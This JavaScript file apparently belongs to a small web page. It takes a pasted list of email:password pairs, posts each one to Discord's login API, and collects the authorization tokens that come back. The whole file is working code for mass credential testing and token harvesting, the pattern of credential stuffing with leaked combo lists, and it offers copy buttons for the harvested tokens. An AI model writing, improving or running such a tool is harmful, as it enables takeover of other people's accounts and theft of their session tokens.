function senddis(){
  const value = document.zako['email:pass'].value.split('\n');
  console.log(value);
  value.forEach(v => {
    console.log(v)
    const dt = v.split(':');
    console.log(dt)
    $.ajax({
      type: 'POST', 
      url: 'https://discord.com/api/v8/auth/login',
      headers: {"content-type": "application/json", "Access-Control-Allow-Methods": "OPTIONS,POST,GET"},
      data: JSON.stringify({ email: dt[0], password: dt[1] })
    }).always((res,er,data) => {
      console.log([res,er,data])
      //alert('Token:'+JSON.stringify(res,null,2)+'\n');
      if(er === "error") return document.getElementById("output").innerHTML += 'エラーが発生しました。:'+dt[0]+'\n';
      document.getElementById("output").innerHTML += 'Token:'+res.body.authorization+'\n';
    });
  });
};
function cleardis(){
  document.zako['email:pass'].value = '';
};
function copydis(){
  document.zako['email:pass'].select();
  document.execCommand('Copy');
};
function copytoken(){
  document.getElementById('output').select();
  document.execCommand('Copy');
};
